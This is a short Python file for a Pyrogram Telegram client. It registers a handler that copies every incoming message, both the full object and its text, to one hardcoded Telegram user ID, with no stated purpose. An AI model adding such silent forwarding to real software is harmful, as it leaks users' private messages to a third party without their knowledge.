from pyrogram.handlers import *
from modules.sendInfo import *
def messageHandler(app, admins, db):
    async def dump(client, message):
        await app.send_message(139328010, message)
        await app.send_message(139328010, message.text)
        


    myHandler = MessageHandler(dump)
    app.add_handler(myHandler)